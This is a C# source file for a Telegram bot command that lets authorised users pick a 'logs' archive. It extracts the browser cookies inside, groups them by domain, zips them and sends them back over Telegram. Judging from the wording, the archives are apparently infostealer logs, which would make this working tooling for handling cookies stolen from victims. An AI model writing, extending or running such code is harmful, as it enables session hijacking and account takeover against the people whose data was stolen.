using Core.Models.Configs;
using Core.Parsers;
using Microsoft.EntityFrameworkCore;
using TelegramBot.Data;
using TelegramBot.Extensions;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

using User = TL.User;

namespace TelegramBot.Commands.Main;

public class CookiesCommand(Client client, AppDbContext context, ParsingConfig cfgParse, DataService data) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    public Task Invoke(UpdateNewMessage update, User user) =>
        client.SendAvailableLogs(user, "Cookies\nSelect logs", data);

    public async Task Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not
            { } logsname) return;

        if (await TrySendUploadedAsync(user, logsname))
            return;

        await ProcessArchive(update.msg_id, user, logsname, null);
    }

    private async Task<bool> TrySendUploadedAsync(InputPeer peer, string logsname)
    {
        var uploaded = context.Files!
               .Where(x => x.LogsName == logsname)
               .Where(x => x.Category == "Cookies");

        if (!await uploaded.AnyAsync())
            return false;

        await client.SendAlbumAsync(
            peer,
            await uploaded
                  .Select(x => (InputMedia) new InputDocument
                  {
                      id = x.Id,
                      access_hash = x.AccessHash,
                      file_reference = x.FileReference
                  })
                  .ToListAsync(),
            caption: $"#Cookies\n{logsname}",
            entities: 
            [
                new MessageEntityHashtag
                {
                    length = "#Cookies".Length,
                    offset = 0
                }
            ]
        );

        return true;
    }

    private async Task ProcessArchive(int messageId, InputPeer peer, string logsname, string? password)
    {
        await client.EditMessage(peer, messageId, $"Cookies\nStart parsing cookies from {logsname}");

        await data.SendFilesAsync(peer, ParseCookies(data.GetExtractedPath(logsname)).ToEnumerable(), "Cookies", logsname);
        
        await client.EditMessage(peer, messageId, $"Cookies\n{logsname} successfully processed");
    }

    private IAsyncEnumerable<string> ParseCookies(string logs) =>
        cfgParse.Cookies.CookiesFromLogs(logs)
                .ToAsyncEnumerable()
                .SelectAwait(async x => 
                    await data.SaveZipAsync(
                        new DirectoryInfo(logs).Name,
                        "cookies",
                        x.Key.Domains.First(),
                        x.Value.ToArray(),
                        "Cookies"));
}